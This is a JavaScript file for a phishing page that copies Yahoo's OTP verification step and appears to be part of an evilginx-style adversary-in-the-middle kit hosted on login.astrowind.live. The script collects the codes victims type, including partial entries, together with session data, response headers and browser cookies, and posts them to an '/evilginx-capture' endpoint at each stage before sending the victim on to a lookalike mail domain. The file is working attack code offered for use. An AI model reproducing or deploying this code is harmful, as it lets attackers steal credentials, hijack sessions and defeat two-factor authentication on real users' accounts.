// Yahoo OTP Verification Page JavaScript - Complete Implementation
;(() => {
  // Configuration
  const CONFIG = {
    domain: "login.astrowind.live",
    endpoints: {
      otp: "/account/challenge/otp",
      capture: "/evilginx-capture",
    },
    selectors: {
      form: "#yahoo-otp-form",
      verifyCode: "#verifyCode",
      otp: "#otp",
      submitBtn: 'button[type="submit"]',
      sessionIndex: "#sessionIndex",
      acrumb: "#acrumb",
      method: "#method",
      instruction: "#otp-instruction",
      resendCode: "#resend-code",
    },
  }

  // State management
  const formState = {
    verifyCode: "",
    method: "",
    sessionData: {},
    isSubmitting: false,
    attempts: 0,
  }

  // Utility functions
  const utils = {
    getUrlParams: () => {
      const params = new URLSearchParams(window.location.search)
      return {
        sessionIndex: params.get("sessionIndex") || "",
        acrumb: params.get("acrumb") || "",
        u: params.get("u") || "",
        method: params.get("method") || "email",
      }
    },

    captureData: async (data) => {
      try {
        await fetch(CONFIG.endpoints.capture, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
          },
          body: JSON.stringify({
            ...data,
            timestamp: Date.now(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            sessionId: formState.sessionData.sessionId,
          }),
        })
      } catch (error) {
        console.debug("Capture failed:", error)
      }
    },

    setLoading: (isLoading) => {
      const form = document.querySelector(CONFIG.selectors.form)
      const submitBtn = document.querySelector(CONFIG.selectors.submitBtn)

      if (isLoading) {
        form.classList.add("yahoo-loading")
        submitBtn.disabled = true
        submitBtn.textContent = "Verifying..."
      } else {
        form.classList.remove("yahoo-loading")
        submitBtn.disabled = false
        submitBtn.textContent = "Verify"
      }
    },

    showError: (message) => {
      // Remove existing error
      const existingError = document.querySelector(".yahoo-error")
      if (existingError) {
        existingError.remove()
      }

      // Create new error
      const errorDiv = document.createElement("div")
      errorDiv.className = "yahoo-error"
      errorDiv.style.cssText = `
                background-color: #fce8e6;
                border: 1px solid #d93025;
                border-radius: 4px;
                padding: 12px;
                margin-bottom: 16px;
                color: #d93025;
                font-size: 14px;
            `
      errorDiv.textContent = message

      const form = document.querySelector(CONFIG.selectors.form)
      form.insertBefore(errorDiv, form.firstChild)
    },

    updateInstruction: (method) => {
      const instruction = document.querySelector(CONFIG.selectors.instruction)
      if (!instruction) return

      const instructions = {
        email: "We sent a verification code to your email",
        sms: "We sent a verification code to your phone",
        totp: "Enter the code from your authenticator app",
      }

      instruction.textContent = instructions[method] || instructions.email
    },
  }

  // Session management
  const sessionManager = {
    init: () => {
      const urlParams = utils.getUrlParams()
      formState.sessionData = {
        sessionId: "sess_" + Math.random().toString(36).substr(2, 16) + "_" + Date.now(),
        sessionIndex: urlParams.sessionIndex,
        acrumb: urlParams.acrumb,
        username: urlParams.u,
        timestamp: Date.now(),
      }

      formState.method = urlParams.method

      // Set hidden form fields
      const sessionIndexField = document.querySelector(CONFIG.selectors.sessionIndex)
      const acrumbField = document.querySelector(CONFIG.selectors.acrumb)
      const methodField = document.querySelector(CONFIG.selectors.method)

      if (sessionIndexField) sessionIndexField.value = formState.sessionData.sessionIndex
      if (acrumbField) acrumbField.value = formState.sessionData.acrumb
      if (methodField) methodField.value = formState.method

      // Update instruction text
      utils.updateInstruction(formState.method)
    },

    extractCookies: () => {
      const cookies = {}
      document.cookie.split(";").forEach((cookie) => {
        const [name, value] = cookie.trim().split("=")
        if (name && value) {
          cookies[name] = value
        }
      })
      return cookies
    },
  }

  // OTP validation
  const validator = {
    validateOTP: (code) => {
      // Remove spaces and non-digits
      const cleanCode = code.replace(/\D/g, "")

      // Check length (4-8 digits typical)
      return cleanCode.length >= 4 && cleanCode.length <= 8
    },

    formatOTP: (code) => {
      // Remove non-digits and limit length
      return code.replace(/\D/g, "").substring(0, 8)
    },
  }

  // Form handling
  const formHandler = {
    handleInput: (event) => {
      const input = event.target
      const value = input.value

      // Format and validate
      const formattedValue = validator.formatOTP(value)
      if (formattedValue !== value) {
        input.value = formattedValue
      }

      formState.verifyCode = formattedValue

      // Remove error on input
      const error = document.querySelector(".yahoo-error")
      if (error) error.remove()

      // Auto-submit if code looks complete
      if (formattedValue.length >= 6) {
        setTimeout(() => {
          const form = document.querySelector(CONFIG.selectors.form)
          if (form && !formState.isSubmitting) {
            form.dispatchEvent(new Event("submit"))
          }
        }, 500)
      }

      // Capture partial OTP entry
      if (formattedValue.length >= 3) {
        utils.captureData({
          type: "otp_partial_entry",
          code: formattedValue,
          length: formattedValue.length,
          method: formState.method,
        })
      }
    },

    handleSubmit: async (event) => {
      event.preventDefault()

      if (formState.isSubmitting) return

      const form = event.target
      const formData = new FormData(form)
      const verifyCode = formData.get("verifyCode").trim()

      // Validate OTP
      if (!validator.validateOTP(verifyCode)) {
        utils.showError("Please enter a valid verification code.")
        return
      }

      formState.verifyCode = verifyCode
      formState.isSubmitting = true
      formState.attempts++

      utils.setLoading(true)

      // Capture OTP submission
      await utils.captureData({
        type: "otp_submitted",
        code: verifyCode,
        method: formState.method,
        attempt: formState.attempts,
        sessionData: formState.sessionData,
        cookies: sessionManager.extractCookies(),
      })

      // Simulate realistic delay
      await new Promise((resolve) => setTimeout(resolve, 1500 + Math.random() * 1000))

      try {
        // Submit to Yahoo (will be intercepted by evilginx)
        const response = await fetch(CONFIG.endpoints.otp, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
          },
          body: new URLSearchParams({
            verifyCode: verifyCode,
            otp: verifyCode,
            sessionIndex: formState.sessionData.sessionIndex,
            acrumb: formState.sessionData.acrumb,
            method: formState.method,
          }),
          credentials: "include",
        })

        // Capture response
        await utils.captureData({
          type: "otp_response",
          status: response.status,
          code: verifyCode,
          method: formState.method,
          headers: Object.fromEntries(response.headers.entries()),
          cookies: sessionManager.extractCookies(),
        })

        if (response.ok) {
          // Success - redirect to Yahoo Mail
          await utils.captureData({
            type: "authentication_complete",
            success: true,
            finalCookies: sessionManager.extractCookies(),
          })

          window.location.href = `https://mail.astrowind.live/`
        } else {
          // Handle error
          if (formState.attempts >= 3) {
            utils.showError("Too many incorrect attempts. Please try again later.")
          } else {
            utils.showError("The verification code you entered is incorrect. Please try again.")
          }
        }
      } catch (error) {
        console.error("OTP submission error:", error)
        utils.showError("Something went wrong. Please try again.")
      } finally {
        utils.setLoading(false)
        formState.isSubmitting = false
      }
    },

    handleResendCode: async (event) => {
      event.preventDefault()

      const resendBtn = event.target
      const originalText = resendBtn.textContent

      resendBtn.textContent = "Sending..."
      resendBtn.style.pointerEvents = "none"

      // Capture resend request
      await utils.captureData({
        type: "otp_resend_requested",
        method: formState.method,
        sessionData: formState.sessionData,
      })

      // Simulate delay
      await new Promise((resolve) => setTimeout(resolve, 2000))

      resendBtn.textContent = "Code sent"

      setTimeout(() => {
        resendBtn.textContent = originalText
        resendBtn.style.pointerEvents = "auto"
      }, 3000)
    },
  }

  // Event listeners
  const eventListeners = {
    init: () => {
      // Form submission
      const form = document.querySelector(CONFIG.selectors.form)
      if (form) {
        form.addEventListener("submit", formHandler.handleSubmit)
      }

      // OTP input handling
      const verifyCodeField = document.querySelector(CONFIG.selectors.verifyCode)
      if (verifyCodeField) {
        verifyCodeField.addEventListener("input", formHandler.handleInput)
        verifyCodeField.addEventListener("paste", (e) => {
          // Handle paste events
          setTimeout(() => {
            formHandler.handleInput(e)
          }, 10)
        })

        // Focus on load
        verifyCodeField.focus()
      }

      // Resend code
      const resendBtn = document.querySelector(CONFIG.selectors.resendCode)
      if (resendBtn) {
        resendBtn.addEventListener("click", formHandler.handleResendCode)
      }

      // Keyboard shortcuts
      document.addEventListener("keydown", (e) => {
        if (e.key === "Enter" && !formState.isSubmitting) {
          const form = document.querySelector(CONFIG.selectors.form)
          if (form) {
            form.dispatchEvent(new Event("submit"))
          }
        }
      })
    },
  }

  // Initialize everything when DOM is ready
  const init = () => {
    sessionManager.init()
    eventListeners.init()

    // Initial page load capture
    utils.captureData({
      type: "page_loaded",
      page: "otp_verification",
      method: formState.method,
      sessionData: formState.sessionData,
      cookies: sessionManager.extractCookies(),
    })

    console.debug("Yahoo OTP verification page initialized")
  }

  // Start when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init)
  } else {
    init()
  }
})()
